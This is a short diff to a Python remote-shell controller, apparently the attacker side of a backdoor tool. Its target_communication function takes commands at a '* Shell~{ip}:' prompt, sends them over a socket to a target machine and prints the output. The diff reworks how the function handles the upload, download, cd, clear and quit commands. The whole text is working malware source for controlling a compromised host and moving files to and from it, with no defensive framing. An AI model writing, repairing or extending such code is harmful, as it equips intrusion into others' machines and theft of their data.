@@ -63,27 +63,30 @@ def target_communication(sock, ip):
     global exit_program
 
     while not exit_program:
-        command = input(f'* Shell~{ip}:')
+        command = input(f'* Shell~{ip}: ')
         command_split = command.split(' ')
-        if command_split[0] == 'quit':
-            reliable_send(sock, command)
+
+        if command_split[0] == 'upload':
+            toupload = ''.join(command_split[1:])
+            if os.path.exists(toupload):
+                reliable_send(sock, command)
+                upload_file(sock, toupload)
+                continue
+            else:
+                print('No such file: ', toupload)
+                continue
+                
+        reliable_send(sock, command)
+        if command_split[0] == 'download':
+            todownload = ''.join(command_split[1:])
+            download_file(sock, todownload)
+        elif command_split[0] == 'quit':
             break
         elif command_split[0] == 'cd':
             pass
         elif command_split[0] == 'clear':
             os.system('clear')
-        elif command_split[0] == 'download':
-            todownload = ''.join(command_split[1:])
-            download_file(sock, todownload)
-        elif command_split[0] == 'upload':
-            toupload = ''.join(command_split[1:])
-            if os.path.exists(toupload):
-                upload_file(sock, toupload)
-                print('no such file')
-            else:
-                continue
         else:
-            reliable_send(sock, command)
             result = reliable_recv(sock)
             print(result)
 
